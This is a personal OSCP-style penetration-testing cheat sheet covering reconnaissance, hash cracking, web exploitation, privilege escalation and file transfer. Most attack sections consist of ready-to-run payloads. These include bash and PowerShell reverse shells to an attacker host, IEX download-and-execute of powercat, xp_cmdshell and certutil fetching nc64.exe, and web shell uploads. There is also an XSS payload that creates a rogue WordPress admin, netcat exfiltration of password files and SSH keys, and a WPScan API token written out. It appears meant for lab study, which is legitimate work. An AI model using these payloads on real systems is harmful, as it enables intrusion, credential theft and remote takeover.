- [Capture the flag](#capture-the-flag)
- [Penetration testing methodology](#penetration-testing-methodology)
- [Web application attack](#web-application-attack)
- [Encode-Decode-Hash](#encode-decode-hash)
- [Reverse shell](#reverse-shell)
- [Files transfer](#files-transfer)
- [Public exploit](#Public-exploit)
- [Remote to other machines](#remote-to-other-machines)
- [Ports scan](#ports-scan)
- [Port tunneling and port redirection](#port-tunneling-and-port-redirection)
- [Kali built in wordlist and payloads](#kali-built-in-wordlist-and-payloads)
- [OSCP Vulnerable Software Versions](#oscp-vulnerable-software-versions)
- [OSCP Pro tips](#oscp-pro-tips)
- [Cracking Tools](#cracking-tools)

# Capture the flag 
- Flag format: `OS{68c1a60008e872f3b525407de04e48a3}`  
  - Linux
    - `find / -name "local.txt" 2>/dev/null`  
    - `cat /home/<username>/local.txt`  
    - `cat /root/proof.txt`  
  - Windows
    - `PS C:\users> Get-ChildItem -Path C:\ -Recurse -Filter "local.txt" -ErrorAction SilentlyContinue`  
    - `type C:\Users\<username>\Desktop\local.txt`  
    - `type C:\Users\Administrator\Desktop\proof.txt`
      
# Penetration testing methodology
1. Identify in-scope hosts: servers, workstations, network devices
1. Info gathering (passive or active): org infra, assets, personnel
   - WHOIS: registrar info, domain owner, nameserver, contract emails
     - `whois example.com` `whois 192.168.1.100`
   - DNS: find hostname, subdomains, zone transfer
     - `nslookup example.com` `host -t txt megacorpone.com`
   - Public resources: LinkedIn, GitHub, Shodan, Google search
   - active recon: nmap for host discovery, ports, service, version, banner grabbing
     - Quick top-ports-scan  
       `nmap -T4 --top-ports 1000 -sV -oN quick_tcp.txt <IP> --open`  
     - **Full TCP scan**   
       🔍 `nmap -p- -sV -oN full_tcp.txt <IP> --open`  
     - UDP scan (53 DNS, 69 TFTP, 123 NTP, 137/138 NetBIOS, 161 SNMP, 500 IKE/IPSec)    
       `nmap -sU --top-ports 100 -oN top100_udp.txt <IP> --open`  
       `nmap -sU -p- -oN full_udp.txt <IP>`  
     - Combined TCP & UDP  
       `nmap -sS -sU --top-ports 100 -oN top_tcp_udp.txt <IP> --open`
     - check for port open  
       `sudo nmap -sS -p 139,445 192.168.165.0/24 --open`  
   - protocols
     - SSH
       - connect to the victim
         `ssh -i <private_key_file> <user>@<target_ip>`  
     - FTP
       - `ftp -A <target>` #login with anonymous credentialss
         ```
         #upload
         ftp> binary
         ftp> put [binary_file]

         #download
         ftp> get test.txt
         ```  
     - SMB  
       - **enumerate users, groups, shares, OS info, password policy**  
         🔍 `enum4linux -a <IP> > SMB_enum_users.txt`  
       - scan for vulnerabilities  
         `nmap --script=smb-vuln* -p445 <IP>`
       - List shares  
         `smbclient -L //<IP> -N` (anonymous)  
         `smbclient -L //<IP> -U <user>` (with credentials)  
         `net view \\dc01 /all`  (domain controller)   
     - SMTP
       - user enumeration  
         `nmap --script=smtp-commands,smtp-enum-users -p25 <IP>`
       - verify user  
         `nc -nv <target> 25` `VRFY root`  
     - SNMP  
       - enumerate all MIB tree of SNMPv1  
         `snmpwalk -c public -v1 -t 5 <target>`
1. Web application recon
   - ❗**Edit hosts and access the site by hostname** (show the actual site instead of default page)      
     `sudo nano /etc/hosts`  
     192.168.126.13    intranet.local
   - Software and tech   
     `whatweb http://<IP>`  
     `curl -I http://<IP>`  
   - Enum directory  
     `gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -t5`
   - Enum API
     pattern  
     ```
     {GOBUSTER}/v1
     {GOBUSTER}/v2
     ```
     `gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern`  
   - Web data  
     `curl http://<IP>/robots.txt`
     `curl http://<IP>/sitemap.xml`  
   - Vulnerabilities   
     `nikto -h http://<IP>`  
     `wpscan --url http://alvida-eatery.org --api-token Cnwa5qbii36TyV5oHvnXnQObqC1CQAkJdPsaf5T8i0c` [API token](https://wpscan.com/api/)   
1. Vulnerability detection
   - Identify unpatched services (E.g: SMB, RDP, Apache, MySQL)
   - Check for default/weak credentials
   - automated scanners: nmap --script vuln, nikto, wpscan
   - manual verification: test SQLi, LFI/RFI, command injection, file upload functionality
   - tools: nmap, AutoRecon
   - NSE vulnerability script  
     `sudo nmap -sV -p 443 --script "vuln" <target>`  
1. Initial foothold    
   - Exploit vulnerable service: SMB, FTP, RDP, SSH
   - web fuzzing: Feroxbuster, WFUF, Burp
   - Web exploitation: SQLi → shell upload, RCE
   - Credential reuse / default creds  
   - tools: nc, curl, wget, hydra, gobuster
   - password cracking: John, Hashcat, Hydra  
1. Privilege escalation
   - Linux (LinPEAS)
     - Kernel exploits `searchsploit`
     - SUID/SGID binaries `find / -perm -4000 -type f 2>/dev/null`
     - Misconfigured sudoers or cron jobs
     - Password reuse (from .ssh, history, config files)  
   - Windows (WinPEAS)
     - Weak ACLs / unquoted service paths
     - Vulnerable software (MS17-010 / EternalBlue)
     - Token impersonation (Mimikatz)
     - Cached creds or saved passwords (ntds.dit, SAM/SYSTEM)
     - Enumerate both local & domain privileges
1. Lateral movement
   - Windows: Pass-the-Hash, Kerberos attacks, RDP, SMB, WMI
   - Linux: SSH key reuse, weak passwords, cron jobs
   - Pivoting via compromised host (ligolo-ng, Impacket, CME, Chisel, proxychains, ssh -L, socat)    
1. Report
   - Scope & methodology
   - Hosts discovered and services.
   - Vulnerabilities and exploitation steps.
   - Evidence (screenshots, file hashes, flags).
   - Recommendations for mitigation
     - Patch systems, close unused ports/services
     - Enforce strong passwords and multi-factor authentication
     - Limit user privileges (principle of least privilege)
     - Monitor for suspicious activity and audit logs
     - Network segmentation and firewall rules

# Encode-Decode-Hash    
- Base64 for web: [CyberChef](https://gchq.github.io/CyberChef/)  
- Hash identify: [Hash analyzer](https://www.tunnelsup.com/hash-analyzer/)  
- Hash identify: [hashcat example](https://hashcat.net/wiki/doku.php?id=example_hashes)  
- Hash tracker: [CrackStation](https://crackstation.net/)  
- Base64 encoded: `b2Zmc2VjMTIzIQ==`  
- common hash types  
  `hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo4.rule --force`  
  `hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`  
  `hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force`    
  `hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`   
  `hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`  
  - Linux
    - md5crypt ($1$) -m 500 `$1$28772684$iEwNOgGugqO9.bIz5sk8k/`  
    - phpass / WordPress ($P$) -m 400 `$P$984478476IagS59wHZvyQMArzfx58u.`  
    - OpenSSH Private Key ($sshng$6$) -m 22921 `$sshng$6$8$7620048997557487....`  
  - Windows
    - **NTLM -m 3000** `b4b9b02e6f09a9bd760f388b67351e2b`  
    - **LM -m 3000** `299bd128c1101fd6`  
    - NetNTLMv2 -m 5600 `admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c78303100000`  
    - Kerberos 5 AS-REP (etype 23) ($krb5asrep) -m 18200 `$krb5asrep$23$user@domain.com:3e156ada591263b8aa`  
    - Kerberos 5 TGS-REP (etype 23) ($krb5tgs) -m 13100 `$krb5tgs$23$*user$realm$test/spn*$63386d22d359fe42230300d56852c9eb$891ad31d0`  
  - Application
    - **MD5 -m 0** `8743b52063cd84097a65d1633f5c74f5` (32 hex)  
    - **SHA-1 -m 100** `b89eaac7e61417341b710b727768294d0e6a277b` (40 hex)  
  - DB
    - KeePass -m 13400 ($keepass$*1) `$keepass$*1*50000*0*375756b9e6c72891a8e5645a3338b8c`  
    - Atlassian (PBKDF2-HMAC-SHA1) -m 12001 `{PKCS5S2}NzIyNzM0NzY3NTIwNjI3MdDDis7wPxSbSzfFqDGf7u/L00kSEnupbz36XCL0m7wa`  
  
# Web application attack  
- **Cross-site scripting**
  - ⚠️ **Goal: steal cookies, CSRF admin request**  
  - Inspect: search boxes, comment fields, username/password, contact form, URL param, HTTP headers (referer, user-agent) 
  - Check how values rfected without proper sanitization
    ```
    <script>alert(1)</script>  
    "><script>alert(1)</script>  #inside-html tag
    " onmouseover=alert(1) x=" #inside attribute
    ';alert(1);// #inside JS

    #bypass
    &lt;script&gt;alert(1)&lt;/script&gt;
    <ScRiPt>alert(1)</sCrIpT>
    <img src=x onerror=alert(1)>
    %3Cscript%3Ealert(1)%3C/script%3E
    ```
  - Input accepts unsanitized input < > ' " { } ;  
  - Fuzz: `wfuzz -w payloads/xss.txt -d "name=FUZZ&msg=test" http://target.com/contact.php` 
  - Testing vulnerability by using payload: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc
  - Create new user and privilege via XSS (user-agent vulnerable field)  
    1. run this function and get the encoded js
       ```
         function encode_to_javascript(string) {
              var input = string
              var output = '';
              for(pos = 0; pos < input.length; pos++) {
                  output += input.charCodeAt(pos);
                  if(pos != (input.length - 1)) {
                      output += ",";
                  }
              }
              return output;
          }
          
        let encoded = encode_to_javascript('var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);')
        console.log(encoded)
       ```
    2. Intercept the burp request GET / and modify the user-agent    
       `<script>eval(String.fromCharCode(118,97,114,32,97,106,97,....))</script>`
    3. Login to wp-admin/admin.php > Visitors plugin  
    4. Go to users menu and new user "attacker" created  
  - Embeds a web shell in wordpress plugin and RCE command from url  
    ```
    https://github.com/jckhmr/simpletools/blob/master/wonderfulwebshell/wonderfulwebshell.php
    nano webshell.php
    zip webshell.zip webshell.php
    Upload plugin.zip and activate
    http://offsecwp/wp-content/plugins/mylovelywebshell/webshell.php/?cmd=find%20/%20-name%20flag%202%3E/dev/null: find flag
    http://offsecwp/wp-content/plugins/mylovelywebshell/webshell.php/?cmd=cat%20/tmp/flag
    ```
- **Directory traversal**
  - ⚠️ **Goal: access credentials/store ssh private key by using relative paths**  
    `http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd`
    `curl http://192.168.50.16/cgibin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`
  - Inspect: url?**page=**xxx
  - Connect SSH from stolen private key
    ```
    curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/<username>/.ssh/id_rsa -o dt_key
    chmod 400 dt_key
    ssh -i dt_key -p 2222 offsec@mountaindesserts.com
    ```
- **Local file inclusion (LFI)**
  - ⚠️ **Goal: load system files and RCE via log file**   
    `http://target.com/index.php?page=../../../../etc/passwd`
  - Inspect: url?**page=**xxx
  - Include the log file via LFI  
    1. Map env (server & log paths)
       **Linux/Apache: /var/log/apache2/access.log or /var/log/httpd/access_log**
       Windows (XAMPP/Apache): C:\xampp\apache\logs\access.log  
    3. Test log inclusion in header (User-Agent)      
       `<?php echo system($_GET['cmd']); ?>`
       `http://target.com/index.php?page=/var/log/apache2/access.log&cmd=id`  
    5. start netcat listener from kali   
       `nc -nvlp 4444`
    6. URL encoding to bypass bad request error   
       `../../../../../../../../../var/log/apache2/access.log&cmd=ls%20-la`
    7. Include 💣 **reverse shell**    
       `bash -i >& /dev/tcp/<kali>/4444 0>&1` #bash  
       `bash -c "bash -i >& /dev/tcp/<kali>/4444 0>&1"` #bourne shell (sh)  
       `bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<kali>%2F4444%200%3E%261%22`  #encoding  
  - PHP wrappers  
    - encode the PHP snippet into base64  
      `kali@kali:~$ echo -n '<?php echo system($_GET["cmd"]);?>' | base64`  
    - execute system command  
      `kali@kali:~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZW
NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
- **Remote file inclusion (RFI)**   
  - ⚠️ **Goal: load malicious PHP payload from kali**    
  - Inspect: url?**page=**xxx  
  - start kali webshells  
    `kali@kali:/usr/share/webshells/php/$ python3 -m http.server 80`  
  - exploit RFI  
    `curl "http://mountaindesserts.com/meteor/index.php?page=http://<kali>/simple-backdoor.php&cmd=ls"`
- **File upload vulnerabilities**    
  - Goal  
    - ⚠️ **upload and execute web shell/RCE-->revere shell**    
    - Upload SSH key into ~/.ssh/authorized_keys   
    - upload malicious xss (stored XSS)  
  - Inspect: file upload input, request param ?file=upload, API endpoints (upload.php, file_upload)  
  - Bypass
    - ❗**filename extensions**: .phps, .php7, .pHP, .php5, .phtml
    - double extensions: shell.php.jpg, shell.php;.jpg  
    - MIME manipulation: Content-Type: image/png but payload is PHP
    - null byte injection: `shell.php%00.jpg`  
  - 💣 get **reverse shell**  
    1. start netcat listener from kali  
       `nc -nvlp 4444`
    2. Execute webshell command  
       `curl http://<target>/meteor/uploads/simple-backdoor.pHP?cmd=dir`  
    3. Use Kali's PowerShell to generate encoded reverse shell one-liner
       ```
       kali@kali:~$ pwsh
     
       PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("<kali>",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeNameSystem.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte =([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

       PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)  
       PS> $EncodedText =[Convert]::ToBase64String($Bytes)  
       PS> $EncodedText
       ...
       PS> exit
       ```
    5. Using curl to send the base64 encoded reverse shell oneliner  
       ```
       curl http://192.168.50.189/meteor/uploads/simplebackdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0... AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
       ```
  - **Overwrite the authorized keys**
    1. Generate local private keys in kali
       ```
       kali@kali:~$ ssh-keygen
       Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
       cat fileup.pub > authorized_keys
       ```
    3. modify the filename (relative path) in burp request  
       `filename="../../../../../../../root/.ssh/authorized_key"` 
    4. Connect to SSH  
       `kali@kali:~$ rm ~/.ssh/known_hosts`  
       `kali@kali:~$ ssh -p 2222 -i fileup root@mountaindesserts.com`  
- **Command injection**
  - ⚠️ **execute web shell/RCE-->revere shell**
  - Inspect: ?page=, ?id=, ?cmd=
  - detect:   
    `(dir 2>&1 *'|echo CMD);&<# rem #>echo PowerShell`          
    `curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://<target>:8000/archive` #send url encoding
  - 💣 get reverse shell  
    1. serve Powercat via Python web server  
       `kali@kali:~$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .`
    3. start web server  
       `kali@kali:~$ python3 -m http.server 80`  
    5. start netcat listener on port 4444  
       `kali@kali:~$ nc -nvlp 4444`
    7. Download Powercat and create a reverse shell via command injection
       `Archive=git;IEX (New-Object System.Net.Webclient).DownloadString("http://<ATTACKER_IP>/powercat.ps1");powercat -c <ATTACKER_IP> -p <PORT> -e powershell`  > send encoding payload  
       `kali@kali:~$ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<kali>%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<kali>%20-p%204444%20-e%20powershell' http://<target>:8000/archive`  
- **SQL injection attacks**
  - connect DB  
    MYSQL: `mysql -u root -p'root' -h 192.168.50.16 -P 3306`  
    MSSQL: `impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth`  
  - simple payloads
    - error
      `' OR 1=1 --`  
      `' or 1=1 in (select @@version) -- //`  
    - union based  
      `' UNION SELECT null, username, password, description, null FROM users -- //`  
    - booloan
      `offsec' AND 1=1 -- //`
    - time-based
      `offsec' AND IF (1=1, sleep(3),'false') -- //`
      `'; IF (SELECT SUBSTRING(@@version,1,1)) = 'M' WAITFOR DELAY '0:0:3'--`  
  - xp_cmdshell
    ```
    impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
    EXECUTE sp_configure 'show advanced options', 1;
    RECONFIGURE;
    EXECUTE sp_configure 'xp_cmdshell', 1;
    RECONFIGURE;
    EXECUTE xp_cmdshell 'whoami';  
    ```
  - Bind reverse shell
    - Generate Base64 in kali or https://www.revshells.com/ (PowerShell #3 Base64)  
      ```
      pwsh

      $Text = '$client = New-Object System.Net.Sockets.TCPClient("<kali>",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName  System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

      $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
      $EncodedText =[Convert]::ToBase64String($Bytes)
      $EncodedText
      ```
      ```
      ```
    `'; EXECUTE xp_cmdshell 'powershell -e <base64>'; --`
  - upload a PHP Backdoor from SQL  
    `' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE '/var/www/html/webshell.php' #`  
    `192xxx/tmp/webshell.php?cmd=id`  
- 💣 get reverse shell
  1. SQL probe username/password textbox  
     `'; IF (SELECT SUBSTRING(@@version,1,1)) = 'M' WAITFOR DELAY '0:0:3'--`  
  3. Host nc64.exe on a Web Server  
     ```
     wget https://github.com/int0x33/nc.exe/blob/master/nc64.exe

     sudo mv nc64.exe /var/www/html/
     sudo python3 -m http.server 80
     ```
  5. Start a listener on Kali  
     `nc -lvnp 4444`
  7. Use xp_cmdshell download Netcat  
     `'; EXEC xp_cmdshell "certutil -urlcache -f http://<kali>/nc64.exe C:/Windows/Temp/nc64.exe";--`  
  9. Trigger Reverse Shell  
      `'; EXEC xp_cmdshell "C:\Windows\Temp\nc64.exe 192.168.45.165 4444 -e C:\Windows\System32\cmd.exe";--`  
    
# ❗Reverse shell  
- [Reverse Shell Generator](https://www.revshells.com/)
  - Linux `echo $0`  
    - /bin/sh  
    - ❗Interactive bash: `bash -i >& /dev/tcp/<kali>/4444 0>&1`
    - Restricted sh: `bash -c "bash -i >& /dev/tcp/192.168.45.160/4444 0>&1"`
    - Netcat: `nc -nv <KALI_IP> 6666 -e /bin/bash`  
  - Windows `echo %COMSPEC%`  
    - cmd.exe  
    - ❗ Windows with PowerShell:
      `powercat -c <KALI_IP> -p 4444 -e powershell`
      ```
      #Kali
      cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
      python3 -m http.server 80

      #Target OS command injection
      curl -X POST --data 'Archive=git;IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.170/powercat.ps1");powercat -c <kali> -p 4444 -e powershell' http://<target>:8000/archive  
      ```
    - No PowerShell/PowerCat: `C:\Windows\Temp\nc64.exe <KALI_IP> 4444 -e C:\Windows\System32\cmd.exe`
  - Bypassing web applications (Command injection)
    1. create shell.ps1 on kali
       ```
       $client = New-Object System.Net.Sockets.TCPClient("<kali>",4444)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        while($true){
          $command = $reader.ReadLine()
          if($command -eq "exit"){break}
          $output = (Invoke-Expression $command 2>&1 | Out-String)
          $writer.WriteLine($output)
          $writer.Flush()
        }
        $client.Close()
       ```
    3. Start listener `nc -lvnp 4444`
    4. Execute the encoded payload on target
       - ?page
         `powershell -EncodedCommand <Base64EncodedString>`
       - RCE
          ```
          $payload = "powershell -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://<kali>/shell.ps1')"""
          $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
          powershell -EncodedCommand $encoded
          ```
     5. Get reverse shell successfully   
- PHP injection/ ready webshell (asp, aspx, cfm, jsp, laudanum, perl, php) locate in kali `/usr/share/webshells/`
  - aspx: cmdasp.aspx
  - php: simple-backdoor.php (cmd), php-reverse-shell.php (reverse web shell)
  - netcat: https://github.com/int0x33/nc.exe/blob/master/nc64.exe
- File upload allowed  
  **step 1 start an HTTP server for file delivey (if need to download the payload from kali): `python3 -m http.server 80`**  
  **step 2 start a netcat listener (ensure port match the payload): `nc -lvnp 4444`**  
  **step 3 generate payload based on target platform**  
  - windows32: `msfvenom -p windows/shell_reverse_tcp LHOST=<KALI> LPORT=443 -f exe -o shell32.exe`
  - windows64: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI>5 LPORT=443 -f exe -o shell64.exe`  
  - Linux x86: `msfvenom -p linux/x86/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f elf -o shell.elf`  
  - Linux x64: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f elf -o shell64.elf`  
  - ASP web shell/vuln upload: `msfvenom -p windows/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f asp -o shell.asp`  
  - PHP web shell/vuln upload: `msfvenom -p php/reverse_php LHOST=<KALI> LPORT=4444 -f raw -o shell.php`
- check if the port is open (FW might block)  
  `nmap -p 80,443, 8443, 8080, 4444 <TARGET_IP>`  
- Kali listener
  `nc -lvnp 443`
    
**Tips:**  
  - Always match LPORT between payload and nc  
  - If you’re serving the payload via HTTP (shell.exe, shell.elf, etc.), make sure it's in the same directory where you started python3 -m http.server  
  - You can also use ports like 443, 53, or 80 as LPORT to bypass firewalls

# Files transfer 
[PEN-200 Transferring file from Windows machine to local Kali VM](https://discordapp.com/channels/780824470113615893/1148907181480104028/1148907181480104028)
 
- **Window**
  - **C:\Windows\System32\config\SAM**
  - **C:\Windows\System32\config\SYSTEM**
  - C:\Windows\System32\config\SECURITY
  - C:\Windows\NTDS\ntds.dit
  - **Mimikatz dump files `sekurlsa::logonpasswords` `lsadump::sam`  **
  - LSASS memory dump `lsass.dmp`
  - plaintext creds: C:\Windows\Panther\Unattend.xml, C:\Windows\sysprep\sysprep.inf
  - task scheduler XML files: C:\Windows\System32\Tasks\
  - **User data: C:\Users\<user>\Desktop, C:\Users\<user>\Documents**
  - **Flag: local.txt, proof.txt**

- **Linux**
  - **SSH keys**
    - ~/.ssh/id_rsa → private key
    - ~/.ssh/id_dsa, ~/.ssh/id_ecdsa, ~/.ssh/id_ed25519
    - ~/.ssh/authorized_keys  
  - **Password and shadow files**
    - /etc/passwd → user accounts
    - /etc/shadow → hashed passwords (requires root)
  - **User Data**
    - /home/<user>/Desktop/*
    - /home/<user>/Documents/*
    - local.txt, proof.txt
  - **Sensitive files for privilege escalation**
    - SUID/SGID binaries you plan to analyze `find / -perm -4000 -type f 2>/dev/null`
    - Scripts with plaintext passwords in /usr/local/bin, /opt/, or /home/*
  - Configs
    - /etc/apache2/sites-available/
    - /etc/nginx/sites-available/
    - /etc/apache2/sites-available/
    - /etc/cron*/*
    - crontab -l for each user
  - Application credential files
    - /var/www/html/config.php (web apps)
    - wp-config.php (WordPress)
  - Logs & Audit
    - /var/log/auth.log → login attempts, sudo usage
    - /var/log/secure → login/authentication info
    - /var/log/syslog → system log
- Windows from/to Kali
  - **RDP mounting shared folder**  
    `xfreerdp3 /u:<USERNAME> /p:<PASSWORD> /v:<IP_ADD> /cert:ignore /drive:share,/home/kali/share`  
    `rdesktop -u <USERNAME> -p <PASSWORD> -d corp.com -r disk:share=/home/kali/share <IP_ADD>`
- **Transfer exploits to windows**
   - `iwr http://<Kali-IP>/file.exe -OutFile file.exe`  
   - `certutil -urlcache -f http://<Kali-IP>/file.exe file.exe`
   - `scp /home/kali/offsec/unix-privesc-check-1.4/unix-privesc-check joe@192.168.185.214:/home/joe`  
   -  `EXEC xp_cmdshell 'powershell -exec bypass -c "(New-Object Net.WebClient).DownloadFile(''http://10.10.201.147:1235/mimikatz.exe'', ''C:\Windows\Tasks\mimikatz.exe'')"'`
   -  Target execute the payload over internet
      ```
      download the package from https://github.com/gentilkiwi/mimikatz/releases
      unzip to /home/kali/offsec/tools/minikatz
      cd to /home/kali/offsec/tools/minikatz/x64
      python3 -m http.server 80

      target open the http://<KALI>
      ```
- Windows to Kali 
  - Internet access
    - WsgiDAV
      ```
      sudo apt install pipx -y
      pipx ensurepath
      pipx install wsgidav
      mkdir ~/share

      wsgidav --host=0.0.0.0 --port=8888 --auth=anonymous --root ~/share
      Windows Machine> Right click PC > Map Network Drive > http://<KALI>:8888/
      ```
   - No internet access
     ```
     #SMB
     kali: impacket-smbserver share /tmp/smb
     target: copy C:\path\to\file.txt \\<Kali-IP>\share\

     smbclient -L \\\\192.168.171.10
     smbclient \\\\192.168.171.10\\<SHARE FOLDER NAME> -N #anonymous access
     smb: \> ls
     smb: \offsec\Downloads\> get flag.txt
     
     #Netcat
     kali: nc -lvnp 4444 > loot.txt
     target: type C:\path\to\loot.txt | nc.exe <Kali-IP> 4444
      
     #Base64 encode
     windows: certutil -encode C:\loot\file.txt file.b6
     kali: base64 -d file.b64 > file.txt
     ```
- Linux to Kali
  - Internet acces
    - Net cat
      ```
      # On Kali (receiver)
      nc -lvnp 4444 > file.txt
      # On target (sender)
      nc <kali_ip> 4444 < file.txt
      ```
  - No internet access
    - Netcat reverse file transfer
      ```
      # On Kali (listener to receive file)
      nc -lvnp 9001 > loot.tar.gz
      # On target (send file)
      tar czf - /etc/passwd | nc <kali_ip> 9001
      ```
    - SCP
      `scp file.txt kali@<kali_ip>:/home/kali/`

# Public exploit  
- Search exploit by service + version  
  `searchsploit vsftpd 2.3.4`
  `searchsploit remote smb microsoft windows`
- select "Remote Code Execution"  
- common search words
  E.g: proftpd 1.3.5, joomla rce, kernel 5.x, samba, apache 2.4.49 rce,  ms17_010, windows iis rce, searchsploit linux kernel 5.4, CVE-2017-0144, windows local privilege escalation  
- Copy exploit locally    
  `searchsploit -m 12345.c`
- Fixing/Modifying exploits
  - change IP/port for reverse shell
  - adjust target path in web RCE
  - modify payload type cmd.exe, powershell, /bin/bash
- software version: qdPM 9.1 - Remote Code Execution (RCE) (Authenticated)
  - `searchsploit qdPM 9.1`: php/webapps/50944.py  
  - `searchsploit -m 50944`  
  - `python3 50944.py -url http://192.168.50.11/project/ -u george@AIDevCorp.org -p AIDevCorp`
  - `curl http://192.168.50.11/project/uploads/users/420919-backdoor.php --data-urlencode "cmd=nc -nv 192.168.50.129 6666 -e /bin/bash"`  
- **.c program** need compile to .exe
  - `searchsploit "Sync Breeze Enterprise 10.0.28"`: windows/dos/42341.c
  - modify the 42341.c (ip, port, target, shellcode)  
  - Compiling the exploit: `kali@kali:~ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`      
  - setting up a Netcat listener on port 443: `kali@kali:~$ sudo nc -lvp 443`  
  - Running the final version of the exploit: `kali@kali:~ sudo wine syncbreeze_exploit.exe`  
- **Upload**: WiFi Mouse 1.7.8.5 - Remote Code Execution
  - `searchsploit "mouse server"`: windows/remote/50972.py
  - `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.165 LPORT=443 -f exe -o shell64.exe`
  - start webserver, and listener
  - `python3 mouseserver_50972.py <target> <kali> shell64.exe`  
- **Bash script**: Apache httpd 2.4.49 - Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
  - `searchsploit "Apache 2.4.49"`: multiple/webapps/50383.sh  
  - start listener   
  - `./apache_2449_50383.sh targets.txt /bin/sh "bash -c 'bash -i >& /dev/tcp/192.168.45.165/4444 0>&1'"`  
- **Python execute directly**: CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution    
  - modify 44976.py (credentials, url, verify=false)    
  - `python2 44976.py`  
  - `http://192.168.171.52/cmsms/uploads/shell.php?cmd=cat /home/flag.txt`    

# Remote to other machines

# Ports scan
  - Kali port:
    - 80, 443, 53 (reverse shell). Second choice: 4444, 1234 (firewall might block)  
    - 8080 (burp suite)
    - 8888 (WebDAV shared)
    - 8000 (Powercat/Python)
  - Target port

| Port  | Protocol | Service     | Description / Use Case                                   | Attack / Enumeration Command |
|-------|----------|-------------|----------------------------------------------------------|-------------------------------|
| *21   | TCP      | FTP         | Anonymous login, weak creds, file upload                 | `nmap --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor -p21 <IP>` <br> `ftp <IP>` |
| *22   | TCP      | SSH         | Weak passwords, key reuse, outdated versions             | `nmap --script ssh2-enum-algos,ssh-hostkey,ssh-auth-methods -p22 <IP>` <br> `hydra -l user -P rockyou.txt ssh://<IP>` |
